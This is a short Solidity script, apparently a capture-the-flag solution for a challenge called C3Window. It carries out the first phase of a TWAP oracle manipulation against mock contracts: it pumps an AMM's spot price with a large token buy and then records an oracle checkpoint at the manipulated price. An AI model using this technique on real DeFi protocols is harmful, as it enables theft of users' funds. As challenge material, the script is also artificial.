// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C3Window.sol";

/// Phase A: pump the pool's spot price, then set the oracle's first TWAP
/// checkpoint. (The solver then advances the chain clock past the window.)
contract SolveC3a is Script {
    function run() external {
        WindowSetup setup = WindowSetup(vm.envAddress("SETUP"));
        MockERC20 usdx = setup.usdx();
        CumAMM amm = setup.amm();
        TwapOracle oracle = setup.oracle();

        vm.startBroadcast();
        usdx.approve(address(amm), type(uint256).max);
        amm.buyToken(9000 ether);     // spot: 1 -> ~100 USDX/token
        oracle.update();              // first checkpoint at the manipulated price
        vm.stopBroadcast();
    }
}
